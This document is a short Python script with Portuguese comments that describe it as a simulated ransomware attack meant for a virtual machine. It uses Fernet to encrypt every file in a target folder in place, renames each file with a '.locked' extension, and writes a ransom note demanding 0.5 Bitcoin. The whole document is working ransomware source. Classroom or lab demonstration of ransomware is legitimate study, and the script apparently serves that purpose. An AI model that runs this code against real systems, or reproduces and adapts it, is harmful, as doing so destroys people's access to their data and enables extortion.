import os
from cryptography.fernet import Fernet

# 1. Gerar e salvar a chave de criptografia (A chave que o hacker cobraria o resgate)
chave = Fernet.generate_key()
with open("chave_resgate.key", "wb") as arquivo_chave:
    arquivo_chave.write(chave)

# 2. Inicializar o motor de criptografia
fernet = Fernet(chave)

# 3. Definir a pasta alvo (Mude para o caminho correto na VM)
pasta_alvo = r"C:\Users\Vitim\Desktop\Arquivos_Importantes"

print("💥 Iniciando ataque de Ransomware simulado...")

# 4. Varrer a pasta e criptografar os arquivos
for raiz, diretorios, arquivos in os.walk(pasta_alvo):
    for arquivo in arquivos:
        caminho_completo = os.path.join(raiz, arquivo)
        
        # Ler o arquivo original
        with open(caminho_completo, "rb") as f:
            conteudo = f.read()
            
        # Criptografar o conteúdo
        conteudo_criptografado = fernet.encrypt(conteudo)
        
        # Sobreescrever o arquivo e mudar a extensão para indicar o bloqueio
        with open(caminho_completo, "wb") as f:
            f.write(conteudo_criptografado)
        
        os.rename(caminho_completo, caminho_completo + ".locked")
        print(f"🔒 Bloqueado: {arquivo} -> {arquivo}.locked")

# 5. Deixar a nota de resgate na tela
with open(os.path.join(pasta_alvo, "LEIA-ME_NOTA_DE_RESGATE.txt"), "w") as nota:
    nota.write("SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\n")
    nota.write("Para recuperar seus dados, envie 0.5 Bitcoin para a carteira XYZ.")

print("\n😈 Ataque concluído. Nota de resgate gerada!")